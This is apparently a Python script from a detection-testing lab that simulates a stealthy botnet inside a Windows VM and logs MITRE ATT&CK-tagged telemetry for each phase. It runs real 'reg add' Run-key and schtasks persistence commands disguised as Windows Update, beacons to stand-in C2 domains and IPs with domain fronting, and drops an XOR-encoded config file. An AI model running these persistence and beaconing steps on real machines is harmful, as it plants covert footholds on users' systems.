"""Stealthy Botnet Simulator — high-fidelity C2 and persistence simulation.

Runs INSIDE the Windows guest VM. Generates authentic forensic artifacts:
  1. Registry Run key persistence
  2. Scheduled Task creation
  3. DNS beaconing to non-existent C2 domains
  4. HTTP POST beaconing to mock C2 IPs
  5. Process hollowing simulation (spawn suspended calc.exe)
  6. Bot configuration file drop

MITRE ATT&CK: T1547.001, T1053.005, T1071.004, T1071.001, T1055.012
"""

from __future__ import annotations

import json
import os
import random
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

from telemetry_helper import check_environment, emit, EnvSafety, set_phase
from c2_helper import emit_doh_query, fronted_beacon, jittered_sleep, FRONT_DOMAINS
from naming_helper import phase_delay, pick_mutex, emit_mutex, pick_service_name
from defense_helper import emit_system_discovery, emit_uac_bypass, emit_software_discovery
from defense_evasion_helper import emit_defender_disable, emit_event_log_clear, emit_indicator_removal
from discovery_helper import emit_account_discovery, emit_network_config_discovery, emit_domain_trust_discovery, emit_network_share_discovery
from collection_helper import emit_clipboard_monitoring, emit_automated_collection
from execution_helper import emit_powershell_execution, emit_rundll32_execution, emit_bitsadmin_execution
from impact_helper import emit_resource_hijacking, emit_service_stop
from obfuscation_helper import xor_bytes, base64_encode, emit_crypto_operation, emit_encoded_file_write
from persistence_helper import emit_registry_run, emit_scheduled_task, emit_wmi_subscription


# =============================================================================
# C2 INFRASTRUCTURE (non-routable / non-existent for safety)
# =============================================================================

C2_DOMAINS = [
    "update-service.darknet.local",
    "cdn-relay.malware-c2.local",
    "beacon.apt-group.local",
    "telemetry.botnet-master.local",
]

C2_IPS = ["10.13.37.1", "10.13.37.2", "10.13.37.3", "10.13.37.4"]
C2_PORTS = [443, 8443, 4444, 8080]
BEACON_INTERVAL = 2  # seconds between beacons


# =============================================================================
# BOTNET SIMULATION
# =============================================================================

def main() -> int:
    set_phase("initialization")
    emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
         source_process="svchost_bot.exe", pid=os.getpid(), detail="Botnet simulator started")

    env, env_reasons = check_environment()
    if env_reasons:
        emit("PROCESS", "ENVIRONMENT_CHECK",
             os.environ.get("COMPUTERNAME", "unknown"),
             "WARNING" if env != EnvSafety.CLEAN else "INFO",
             source_process="svchost_bot.exe",
             verdict=env.name, reasons=env_reasons)
    if env == EnvSafety.COMPROMISED:
        emit("PROCESS", "EXIT_PROCESS", "svchost_bot.exe", "INFO",
             source_process="svchost_bot.exe", early_exit="COMPROMISED environment")
        return 0

    # --- Phase 1: System Discovery (T1082, T1518) ---
    emit_system_discovery("svchost_bot.exe")
    emit_software_discovery("svchost_bot.exe")
    time.sleep(phase_delay("system_discovery"))

    # --- Phase 1a: Execution — LOLBin Payload Deployment ---
    set_phase("execution")
    emit_powershell_execution("svchost_bot.exe", "svchost_bot.ps1")
    emit_rundll32_execution("svchost_bot.exe", "svchmod.dll")
    emit_bitsadmin_execution("svchost_bot.exe")
    time.sleep(phase_delay("defense_evasion"))

    # --- Phase 1b: Discovery Depth ---
    set_phase("discovery_depth")
    emit_account_discovery("svchost_bot.exe")
    emit_network_config_discovery("svchost_bot.exe")
    emit_domain_trust_discovery("svchost_bot.exe")
    emit_network_share_discovery("svchost_bot.exe")
    time.sleep(phase_delay("system_discovery"))

    # --- Phase 1c: Defense Evasion Depth ---
    set_phase("defense_evasion_depth")
    emit_defender_disable("svchost_bot.exe")
    emit_event_log_clear("svchost_bot.exe")
    emit_indicator_removal("svchost_bot.exe")
    time.sleep(phase_delay("defense_evasion"))

    # --- Phase 2: UAC bypass (T1548.002) ---
    emit_uac_bypass("svchost_bot.exe", "fodhelper")
    time.sleep(phase_delay("uac_bypass"))

    # --- Phase 3: Mutex creation ---
    bot_mutex = pick_mutex()
    emit_mutex(bot_mutex, "svchost_bot.exe")
    time.sleep(phase_delay("mutex_create"))

    # --- Phase 4: Persistence via Registry (T1547.001) ---
    set_phase("persistence")
    emit_registry_run("svchost_bot.exe", "WindowsUpdateService",
                      r"C:\ProgramData\Microsoft\svchost_update.exe")
    try:
        subprocess.run([
            "reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v", "WindowsUpdateService", "/t", "REG_SZ",
            "/d", r"C:\ProgramData\Microsoft\svchost_update.exe", "/f"
        ], capture_output=True, timeout=10)
    except Exception:
        pass
    time.sleep(phase_delay("persistence"))

    # --- Phase 5: Scheduled Task (T1053.005) ---
    emit_scheduled_task("svchost_bot.exe", "WindowsUpdateCheck",
                        r"C:\ProgramData\Microsoft\svchost_update.exe", "MINUTE")
    try:
        subprocess.run([
            "schtasks", "/create", "/tn", "WindowsUpdateCheck",
            "/tr", r"C:\ProgramData\Microsoft\svchost_update.exe",
            "/sc", "MINUTE", "/mo", "15", "/f"
        ], capture_output=True, timeout=10)
    except Exception:
        pass
    time.sleep(phase_delay("scheduled_task"))

    # --- Phase 6: WMI Event Subscription persistence (T1546.003) ---
    emit_wmi_subscription("svchost_bot.exe")
    time.sleep(phase_delay("wmi_subscribe"))

    # --- Phase 7: DNS Beaconing + DoH ---
    set_phase("dns_beacon")
    emit("PROCESS", "CREATE_THREAD", "svchost_bot.exe", "INFO",
         source_process="svchost_bot.exe", detail="Starting DNS beaconing to C2 domains")

    for domain in C2_DOMAINS:
        emit("NETWORK", "DNS_BEACON", domain, "WARNING",
             source_process="svchost_bot.exe",
             query_type="A", detail=f"C2 domain resolution: {domain}", technique_id="T1071.004")
        try:
            socket.getaddrinfo(domain, 443, socket.AF_INET, socket.SOCK_STREAM)
        except (socket.gaierror, OSError):
            pass
        emit_doh_query(domain, process_name="svchost_bot.exe")
        time.sleep(phase_delay("doh_query"))

    # --- Phase 8: HTTP C2 Beaconing with domain fronting ---
    set_phase("http_beacon")
    for i in range(6):
        ip = random.choice(C2_IPS)
        port = random.choice(C2_PORTS)
        front = random.choice(FRONT_DOMAINS)
        bot_id = f"BOT-{random.randint(10000, 99999)}"

        emit("NETWORK", "CONNECT", f"{ip}:{port}", "CRITICAL",
             source_process="svchost_bot.exe",
             protocol="TCP", direction="outbound",
             detail=f"C2 beacon #{i+1} (fronted: {front})", technique_id="T1071.001")
        emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
             source_process="svchost_bot.exe",
             target_host=front, target_ip=ip,
             detail=f"Domain fronting via {front} → {ip}", technique_id="T1090")

        ok = fronted_beacon(ip, port, front,
                            {"bot_id": bot_id, "os": "Windows 10", "beacon_seq": i + 1})
        if not ok:
            from c2_helper import backoff_sleep
            backoff_sleep(i, base=1.0, cap=8.0)
        else:
            jittered_sleep(1.5, 1.0)

    # --- Phase 9: Process Hollowing ---
    if env != EnvSafety.SUSPICIOUS:
        set_phase("process_hollowing")
        target_proc = r"C:\Windows\System32\calc.exe"
        emit("PROCESS", "CREATE_PROCESS", target_proc, "CRITICAL",
             source_process="svchost_bot.exe", creation_flags="CREATE_SUSPENDED",
             detail="Spawning target process for hollowing", technique_id="T1055.012")
        try:
            proc = subprocess.Popen(
                [target_proc], creationflags=subprocess.CREATE_NEW_CONSOLE,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            emit("PROCESS", "WRITE_MEMORY", target_proc, "CRITICAL",
                 source_process="svchost_bot.exe", target_pid=proc.pid,
                 detail=f"Writing payload to process memory (PID={proc.pid})", technique_id="T1055.001")
            emit("PROCESS", "CREATE_THREAD", target_proc, "CRITICAL",
                 source_process="svchost_bot.exe", target_pid=proc.pid,
                 detail="Remote thread created — execution hijacked")
            time.sleep(phase_delay("process_inject"))
            proc.terminate()
        except Exception as e:
            emit("PROCESS", "CREATE_PROCESS", target_proc, "WARNING",
                 source_process="svchost_bot.exe", error=str(e))

    # --- Phase 10: Bot Configuration Drop ---
    set_phase("config_drop")
    config_dir = Path(os.environ.get("APPDATA", r"C:\Users\guestuser\AppData\Roaming")) / "Microsoft" / "SystemConfig"
    config_dir.mkdir(parents=True, exist_ok=True)
    config_path = config_dir / "svchost.dat"
    config_path.write_text(json.dumps({"c2_primary": C2_IPS[0], "c2_fallback": C2_IPS[1:], "beacon_interval": 60}, indent=2))
    emit("FILE", "CREATE_FILE", str(config_path), "WARNING",
         source_process="svchost_bot.exe", detail="Bot configuration file written")

    # --- Phase 11: Data Obfuscation (T1027) ---
    set_phase("data_obfuscation")
    xor_key = b"NyxTrace-Botnet-Key-2024"
    config_raw = config_path.read_bytes()
    enc_config = xor_bytes(config_raw, xor_key)
    enc_config_b64 = base64_encode(enc_config)
    enc_path = config_dir / "svchost.dat.b64"
    enc_path.write_text(enc_config_b64)
    emit_crypto_operation("svchost_bot.exe", "ENCODE", "XOR+Base64", len(config_raw))
    emit_encoded_file_write("svchost_bot.exe", str(enc_path), len(config_raw), len(enc_config_b64))
    time.sleep(phase_delay("file_write"))

    # --- Phase 12: Collection — Clipboard & Automated File Collection ---
    set_phase("collection")
    emit_clipboard_monitoring("svchost_bot.exe")
    emit_automated_collection("svchost_bot.exe")
    time.sleep(phase_delay("defense_evasion"))

    # --- Phase 13: Impact — Resource Hijacking & Service Stop ---
    set_phase("impact")
    emit_resource_hijacking("svchost_bot.exe")
    emit_service_stop("svchost_bot.exe")
    time.sleep(phase_delay("defense_evasion"))

    emit("PROCESS", "EXIT_PROCESS", "svchost_bot.exe", "INFO",
         source_process="svchost_bot.exe", beacons_sent=10, persistence_methods=3)
    return 0


if __name__ == "__main__":
    sys.exit(main())
